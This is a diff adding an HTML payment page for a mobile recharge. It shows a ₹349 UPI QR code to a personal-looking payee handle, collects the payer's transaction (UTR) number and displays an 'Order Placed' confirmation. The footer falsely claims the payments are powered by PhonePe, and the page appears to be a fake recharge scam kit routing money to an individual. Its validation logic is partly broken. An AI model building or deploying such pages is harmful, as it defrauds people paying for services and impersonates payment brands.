@@ -1,0 +1,272 @@
+
+<html>
+<head>
+  <title>Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="Pay.css" />
+  <link rel="stylesheet" href="" />
+
+  <script src="https://kit.fontawesome.com/f4f2517463.js" crossorigin="anonymous"></script>
+
+</head>
+<body>
+  
+
+		<script>
+
+		window.onload=function(){
+
+			document.getElementById('loader').style.display="none";
+			document.getElementById('content').style.display="block";
+		};
+		</script>
+		<style>
+		#content{display:none;}
+		#loader{
+	 background: #fff url(Pay.gif) no-repeat center center;
+    background-size:70px;
+    height: 100vh;
+    width: 100%;
+    position: fixed;
+    z-index: 100;
+
+		}
+		#loader img{width:400px;}
+		</style>
+	</head>
+	<body>
+		<div id="loader">
+		
+		</div>
+		<div id="content">
+
+  
+  
+
+  <div class="paymentWrapper">
+    <div class="paymentWrapperCard">
+      <div class="paymentContainer" id="payment-first">
+        <div class="topPaymentWrapper">
+          <img src="back_icon.svg" alt="back button" id="backBtn" onclick="cancelOrder()">
+          <h1>Choose a payment option</h1>
+          <p>Payable Now <span style="font-weight:800;"><i class="fa-solid fa-indian-rupee-sign"></i> 349.00</span>
+          <p class="orderid"></p>
+          
+          
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+       
+          
+          
+          
+        </div>
+        <div class="paymentMethodWrapper">
+          <div class="methodHeading">Payment Options</div>
+
+          </a>
+          <a href="javascript:void(0)" onclick="generateQR();" class="methodsWrapper">
+            <div class="leftSide">
+              <div>
+                <img src="qr_icon.svg" alt="qr_icon">
+              </div>
+              <div>
+                <p style="margin-bottom:0.3rem;font-weight:bold;">Show QRCode</p>
+                <span>Pay with Any UPI App</span>
+              </div>
+            </div>
+            <div class="rightSide">
+              <img src="right_icon.svg" alt="button">
+            </div>
+          </a>
+          <div class="qrCodeWrapper" id="qrCodeWrapper" style="display: none;">
+            <div class="qrCodeTitle">
+              <p style="font-weight: bold"><span style="user-select: all;"></span></p>
+            </div>
+            <div class="qrCodeBody"></div>
+          </div>
+        </div>
+        <div class="btnWrapper" id="continue-first-btn" style="display:none;">
+          <button class="paymentContinueBtn" onclick="paynow();">Continue</button>
+        </div>
+        <div class="paymentFooter">
+          <div class="innerWrapper">
+            <p>Powered By</p>
+            <div style="display: flex;gap: 14px;">
+              <img src="upi.svg" alt="UPI Icon">
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="paymentContainer" id="payment-second" style="display:none">
+        <div class="topPaymentWrapper">
+          <img src="back_icon.svg" alt="back button" onclick="paynow_back()">
+          <h1>Transaction Details</h1>
+          <p style="padding: 0 1rem;margin-top:1.5rem;">Please enter transaction details to validate payment!</p>
+        </div>
+        <div class="paymentMethodWrapper">
+          <div class="inputWrapper" style="margin-top:2rem">
+            <label for="customerUTRNumber">UTR Number (12 Digits)</label>
+            <input type="number" id="customerUTRNumber" name="customerUTRNumber" autocomplete="off" oninput="validateUTRNumber(this);" onkeydown="if(this.value.length==12 && event.keyCode!=8) return false;" />
+          </div>
+          <div class="btnWrapper utrContinueBtn" style="display:none;">
+            <button class="cardPaymentButton" onclick="orderPlaced();">Continue</button>
+          </div>
+        </div>
+        <div class="paymentFooter" style="position: absolute;bottom: 0;">
+          <div class="innerWrapper">
+            <p></p>
+            <div style="display: flex;gap: 14px;">
+
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="paymentContainer" id="payment-third" style="display:none;"></div>
+    </div>
+  </div>
+  <script src="jquery-3.7.0.min.js"></script>
+  <script src="qrcode.min.js"></script>
+  <script>
+    function generateQR(user_input = 'upi://pay?pa=nilesh.io9276.pay@fam&pn=Bharat Payment Private Limited Company&am=349.00&cu=INR') {
+      $('.appPayment').css('display', 'none');
+      $('#backBtn').attr('onclick', 'qr_back();')
+      document.getElementById("qrCodeWrapper").style.display = "flex";
+      $('.qrCodeBody').html(``);
+      var qrcode = new QRCode(document.querySelector(".qrCodeBody"), {
+        text: `${user_input}`,
+        width: 180, //default 128
+        height: 180,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+      });
+      paymentClicked();
+    }
+
+
+    function qr_back() {
+      document.getElementById("qrCodeWrapper").style.display = "none";
+      $('.appPayment').css('display', 'flex');
+      $('#backBtn').attr('onclick', 'cancelOrder();')
+      document.getElementById("continue-first-btn").style.display = "none";
+    }
+
+    function paymentClicked() {
+      document.getElementById("continue-first-btn").style.display = "block";
+      // document.getElementsByClassName('paymentMethodWrapper')[0].classList.add('scroll');
+    }
+
+    function paynow() {
+
+      document.getElementById("payment-first").style.display = "none";
+      document.getElementById("payment-second").style.display = "block";
+      document.getElementById("payment-third").style.display = "none";
+    }
+
+    function paynow_back() {
+      document.getElementById("continue-first-btn").style.display = document.getElementById('qrCodeWrapper').style.cssText == 'display: flex;' ? "block" : "none";
+      document.getElementById("payment-first").style.display = "block";
+      document.getElementById("payment-second").style.display = "none";
+      document.getElementById("payment-third").style.display = "none";
+      document.getElementById('customerUTRNumber').value = ``;
+    }
+
+    function cancelOrder() {
+      document.getElementById("payment-first").style.display = "none";
+      document.getElementById("payment-second").style.display = "none";
+      document.getElementById("payment-third").style.display = "block";
+      document.getElementById("payment-third").innerHTML =
+        `<div class="topPaymentWrapper">
+          <h1>Mobile Recharge Payment Cancelled!</h1>
+          <p style="padding: 0 1rem;margin-top:1.5rem;">You have cancelled Your Recharge Payment!</p>
+        </div>
+      <div class="successIconWrapper">
+        <img src="unchecked.svg" alt="Success Icon">
+        <p style="margin-top:2rem;margin-bottom:0rem;">Your recharge Payment failed !</p>
+      </div>
+      <div class="btnWrapper" style="margin: 2rem 2rem 2rem 2rem;">
+        <button onclick="continueShopping();">Recharge Cancel</button>
+      </div>`;
+    }
+
+    function orderPlaced() {
+      if (document.getElementById("customerUTRNumber").value != "www.priyasingh.com") {
+        $.ajax({
+          type: "POST",
+          url: "",
+          data: {
+            order_id: "5212036956225",
+            utr_number: document.getElementById("customerUTRNumber").value,
+            site_code: "Os7VDYEMNNJChKebqThuSrbhQ1TjXyEHk8uThHN2eE3wpq5iJF"
+          },
+          success: function(response) {
+            try {
+              response = JSON.parse(response);
+              if (response.status == "success") {
+                document.getElementById("payment-first").style.display = "none";
+                document.getElementById("payment-second").style.display = "none";
+                document.getElementById("payment-third").style.display = "block";
+                document.getElementById("payment-third").innerHTML =
+                  `<div class="topPaymentWrapper">
+                  <h1>Order Placed!</h1>
+                  <p style="padding: 0 1rem;margin-top:1.5rem;">Your order is in processing and we are validating your payment!</p>
+                </div>
+                <div class="successIconWrapper">
+                  <img src="checked.svg" alt="Success Icon">
+                  <p style="margin-top:2rem;margin-bottom:0rem;">Transaction Number : ${response.transaction_number}</p>
+                  <p>Please take a screenshot of transaction number</p>
+                </div>
+                <div class="btnWrapper" style="margin: 2rem 2rem 2rem 2rem;">
+                  <button onclick="continueShopping();">Continue Shopping</button>
+                </div>`;
+              } else {
+                alert("Invalid Transaction ID");
+              }
+            } catch (error) {
+              alert("Invalid Transaction ID");
+            }
+          }
+        });
+      } else {
+        alert("Please Enter UTR Number");
+      }
+    }
+
+    function validateUTRNumber(elem) {
+      elem.value = elem.value.replace(/[^0-9.]/g, '');
+      elem.value = elem.value.replace(/(\..*)\./g, '$1');
+      if (elem.value.length == 12) {
+        $(".utrContinueBtn").css('display', 'block');
+      } else {
+        $(".utrContinueBtn").css('display', 'none');
+      }
+    }
+
+    function continueShopping() {
+      window.location.href = "Jio.html";
+    }
+  </script>
+
+
+  <div class="foot">
+    <div class="tip">
+      <img src="secure.png" style="width:12px">
+      100% Secure Payments Powered By PhonePe
+
+    </div>
+
+
+
+
+</body>
+
+</html>
